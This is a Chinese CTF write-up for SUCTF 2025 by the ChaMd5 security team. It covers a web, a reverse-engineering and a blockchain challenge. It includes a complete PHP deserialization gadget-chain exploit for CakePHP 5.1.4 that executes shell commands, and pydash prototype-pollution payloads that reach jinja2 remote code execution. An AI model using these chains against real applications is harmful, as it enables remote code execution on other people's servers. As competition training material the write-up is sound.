---
title: SUCTF 2025 writeup by Min-Venom
url: https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&mid=2247511868&idx=1&sn=5a1dc3baed4c78da2b5f75a78d2730a3&chksm=e89d87e4dfea0ef237728e960ff5e2c177f91801f9a16117a02cdb9b62e9adec26ac8ebf7a4d&scene=58&subscene=0#rd
source: ChaMd5安全团队
date: 2025-01-15
fetch_date: 2025-10-06T20:11:45.051155
---

# SUCTF 2025 writeup by Min-Venom

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/PUubqXlrzBRSMC4ODUc6F3Hdhtn2I1lNr8iciaWWmibYTRrY2Uw1WLCI53nbARAkMhxW9ngu3tZ7tD4Leo9z87OOg/0?wx_fmt=jpeg)

# SUCTF 2025 writeup by Min-Venom

原创

Mini-Venom

ChaMd5安全团队

> > 招新小广告CTF组诚招re、crypto、pwn、misc、合约方向的师傅,长期招新IOT+Car+工控+样本分析多个组招人有意向的师傅请联系邮箱
> >
> > admin@chamd5.org(带上简历和想加入的小组)

## Web:

### SU\_POP

cakephp 5.1.4 版本的，参考网上以前版本的链子都不行了，因为加了个 \_\_wakeup() 魔术方法，需要重新找入口，

发现在 src\Internal\RejectedPromise 类的 \_\_destruct 存在字符串拼接并且 reason 参数可控，那么可以调用任意 \_\_tostring 魔术方法，

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBRSMC4ODUc6F3Hdhtn2I1lNglUkIg5gcicRP10NcibmVVWDVtKX95j27uib33xQsNJMd8Tu8GcBus7aQ/640?wx_fmt=png&from=appmsg)

然后全局找 \_\_tostring 魔术方法，发现两处可以调用到 \_\_call() 魔术方法，这里选择 src\Ast\Type\ConstTypeNode 类，变量 $constExpr 可控，

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBRSMC4ODUc6F3Hdhtn2I1lNNw7kmvOMrUCH16wyzTXaMk4O1Nsic4b5Aym6QZfAcG1GQZfejrnxdAw/640?wx_fmt=png&from=appmsg)

现在需要找到合适的 \_\_call 方法，可以接上老版本的链子， src\ORM\Table 类的 \_\_call 魔术方法

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBRSMC4ODUc6F3Hdhtn2I1lNLEB8TAAUvH5lmVVwtJVGpDTP3ag2UAIJpicygQqq8I9qzUBOxRYXhFA/640?wx_fmt=png&from=appmsg)

同理调用到 call() 方法，依然可以实现调用任意类方法，变量控制逻辑和老版本一样，但只能调用无参方法。利用 seay 工具找了一遍，最后发现 src\Framework\MockObject\Generator\MockClass类中的 generate 方法

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBRSMC4ODUc6F3Hdhtn2I1lNs05otNxpAhQwiaPNrXTkcVxicOhKQVibC9NScmIsZ2tuEdtnB4YB3dACg/640?wx_fmt=png&from=appmsg)

构造exp，可以不用引用接口，题目需要find提权。

```
<?php
namespace PHPUnit\Framework\MockObject\Generator;
interface MockType{}
final class MockClass implements MockType{
    public $mockName;
    public $classCode;
    public function  __construct()
    {
        $this->mockName = "MockClass";
        $this->classCode = "system('find /etc/passwd -exec tac /flag.txt \;');";
    }

}

namespace Cake\Core;
use Countable;
use IteratorAggregate;
abstract class ObjectRegistry implements Countable, IteratorAggregate{
    public $_loaded = [];
}
namespace Cake\Validation;
interface ValidatorAwareInterface{}
namespace Cake\Event;
interface EventListenerInterface{}
namespace Cake\Datasource;
interface RepositoryInterface{}
namespace Cake\Event;
interface EventDispatcherInterface{}
namespace Cake\ORM;
use Cake\Core\ObjectRegistry;
use Cake\Datasource\RepositoryInterface;
use Cake\Event\EventDispatcherInterface;
use Cake\Event\EventListenerInterface;
use Cake\Validation\ValidatorAwareInterface;
use PHPUnit\Framework\MockObject\Generator\MockClass;
use Traversable;
class BehaviorRegistry extends ObjectRegistry implements EventDispatcherInterface{
    public $_methodMap = [];
    public function count(): int{}
    public function getIterator(): Traversable{}
}
class Table implements RepositoryInterface, EventListenerInterface, EventDispatcherInterface, ValidatorAwareInterface
{
    public BehaviorRegistry $_behaviors;
    public function __construct(){
        $a=new MockClass();
        $this->_behaviors = new BehaviorRegistry();
        $this->_behaviors->_methodMap=["__tostring"=>["MockClass","generate"]];
        $this->_behaviors->_loaded=["MockClass"=>$a];
    }

}
namespace React\Promise;
interface PromiseInterface{}

namespace React\Promise\Internal;
use React\Promise\PromiseInterface;

final class RejectedPromise implements PromiseInterface{
    public $reason;
}
namespace PHPStan\PhpDocParser\Ast;
interface Node{};

namespace PHPStan\PhpDocParser\Ast\Type;
use PHPStan\PhpDocParser\Ast\Node;
interface TypeNode extends Node
{
}

namespace PHPStan\PhpDocParser\Ast\Type;
use Cake\ORM\Table;
use React\Promise\Internal\RejectedPromise;

class ConstTypeNode implements TypeNode{
    public $constExpr;
}

$pop = new RejectedPromise();
$pop->reason=new ConstTypeNode();
$pop->reason->constExpr=new Table();
echo base64_encode(serialize($pop));
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBRSMC4ODUc6F3Hdhtn2I1lNGSkHa6P4jibsibMQkH9jN6rRUny9axWIgxWGN7h8doxADbsbexBP1Aow/640?wx_fmt=png&from=appmsg)

## SU\_blog

登陆后发现有file参数，可以实现目录穿越读取任意文件，绕过一下../，获得源码

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBRSMC4ODUc6F3Hdhtn2I1lNyFTDzFWicnnEwfn6iaadIIuNK9Hrglwfdz50nrWxJIo7dlibuwBEYCNkQ/640?wx_fmt=png&from=appmsg)

然后继续读取waf.py，利用../绕过关键字。在源码看到存在pydash原型链污染，搜索一下发现可以利用 jinja2 编译模板时的包 rce，网上payload

```
{"name":"__init__.__globals__.__loader__.__init__.__globals__.sys.modules.jinja2.runtime.exported.0","value":"*;import os;os.system('id')"}
```

这里有 waf 需要绕一下，数字索引还有 2 可以利用，然后通过写文件获得回显，构造

```
{"key": ".__init__.__globals__.t.NamedTuple.__globals__.sys.modules.jinja2.runtime.exported[2]","value": "*;import os;os.system('/read* >/tmp/gaoren.txt')"}
```

最后成功命令执行，这里编译包是只有第一次渲染时才会调用的，所以选择 2 分钟的容器并且多访问几个页面。最后获得flag

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBRSMC4ODUc6F3Hdhtn2I1lNicAVeBibwX4GaGgiaiayQM6okpBujTnhhXpYWfkXVS52JACvEpMKl4KjfA/640?wx_fmt=png&from=appmsg)

## Reverse:

### SU\_BBRE

从给到的txt文本中不难分析出分别有两段加密逻辑，func2对应的是无魔改RC4，密钥是“suctf”

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBRSMC4ODUc6F3Hdhtn2I1lNY1G2TxTKOmn2XzJ9pztzIahiasEXrMHNq7gtFvUlZcJWIRDT4rhMj1g/640?wx_fmt=png&from=appmsg)

第二段直接定位到func1中，不难看出有个下标相加的操作

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBRSMC4ODUc6F3Hdhtn2I1lNs7E1TYYek5R3vkzKt6R7ibkoJlUPxGAlIsZNCwGvricic27aFrI2YYfqQ/640?wx_fmt=png&from=appmsg)

```
data=[0x41,0x6D,0x62,0x4D,0x53,0x49,0x4E,0x29,0x28]
for i in range(len(data)):
    print(chr(data[i]+i),end='')
#AndPWNT00
```

然而将两端flag拼接起来之后还是不太对，flag给的大概意思，本题有pwn的知识点，还有就是程序控制流是怎么到的function1，那么即是从输入的时候有个栈溢出的操作从而劫持了控制流到func1，故而两段flag之间还应该添加func1目标函数的地址才是最后的flag，注意端序问题，调换以下顺序

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBRSMC4ODUc6F3Hdhtn2I1lNPUV3y49j2icXKTeFoOIxcAB9ds9icok6VFicbeQSLFLopSel6FOfZmMkQ/640?wx_fmt=png&from=appmsg)

拼接起来即可：
SUCTF{We1com3ToReWorld="@AndPWNT00}

## Misc:

### Onchain Magician

源码：

```
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.28;

contract MagicBox {
    struct Signature {
        uint8 v;
        bytes32 r;
        bytes32 s;
    }

    address magician;
    bytes32 alreadyUsedSignatureHash;
    bool isOpened;

    constructor() {}

    function isSolved() public view returns (bool) {
        return isOpened;
    }

    function getMessageHash(address _magician) public view returns (bytes32) {
        return keccak256(abi.encodePacked("I want to open the magic box", _magician, address(this), block.chainid));
    }

    function _getSignerAndSignatureHash(Signature memory _signature) internal view returns (address, bytes32) {
        address signer = ecrecover(getMessageHash(msg.sender), _signature.v, _signature.r, _signature.s);
        bytes32 signatureHash = keccak256(abi.encodePacked(_signature.v, _signature.r, _signature.s));
        return (signer, signatureHash);
    }

    function signIn(Signature memory signature) external {
        require(magician == address(0), "Magician already signed in");
        (address signer, bytes32 signatureHash) = _getSignerAndSignatureHash(signature);
        require(signer == msg.sender, "Invalid signature");
        magician = signer;
        alreadyUsedSignatureHash = signatureHash;
    }

    function openBox(Signature memory signature) external {
        require(magician == msg.sender, "Only magician can open the box");
        (address signer, bytes32 signatureHash) = _getSignerAndSignatureHash(signature);
        require(signer == msg.sender, "Invalid signature");
        require(signatureHash != alreadyUsedSignatureHash, "Signature already used");
        isOpened = true;
    }
}
```

分析：和其他的合约 ctf 一样，调用 openBox函数成功使得 isOpened为 ture 即可拿到 flag。
大致一看，这道题需要我们签署原始交易，获得 v, r, s 的值。
•getMessageHash：该函数用于构造合约预期的 message 摘要
•\_getSignerAndSignatureHash：内部函数，用于还原签名的签署者，以及获得签名的哈希
•signIn：传递签名（这里要求我们 msg.sender 和还原出来的签名地址相同，同时在此之前没有调用过该函数），设置 magician = signer
•openBox：传递签名，想要调用成功，需要与上一次调用signIn的 signer 相同，同时签名的哈希不同。
大致分析后，我们可以知道：每个人（signer）的交易哈希都只有一个，但是我们需要有两个不同的有效签名。这个实际上是以太坊的签名拓展性攻击漏洞。
简单来说：由于以太坊底层使用的是 Secp256K1 椭圆曲线，该椭圆曲线，对于一个签名，有两个有效的 s 值。所以，通过构造，我们得到另一个有效的 s 值，将这个 s 值作为调用openBox中传递即可...